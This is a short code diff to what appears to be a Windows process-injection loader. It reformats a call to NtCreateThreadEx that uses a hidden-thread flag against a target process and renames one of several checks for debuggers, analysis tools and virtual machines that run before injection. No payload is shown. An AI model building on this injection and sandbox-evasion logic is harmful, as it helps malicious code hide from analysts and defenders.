@@ -70,7 +70,8 @@ void Run()
 	//NtAllocateVirtualMemory(hProcess, &pCode, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	//NtWriteVirtualMemory(hProcess, pCode, &code, size, nullptr);
 
-	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pCode, NULL, THREAD_FLAG_HIDE, NULL, NULL, NULL, NULL);
+	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pCode, 
+		NULL, THREAD_FLAG_HIDE, NULL, NULL, NULL, NULL);
 	WaitForSingleObject(hThread, INFINITE);
 }
 
@@ -78,7 +79,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 {
 	IsBeingDebugged();
 	AnalysisToolsRunning();
-	SystemHasSufficientHardware();
+	SystemHasCorrectHardware();
 	SystemHasVmDeviceNames();
 
 	Run();
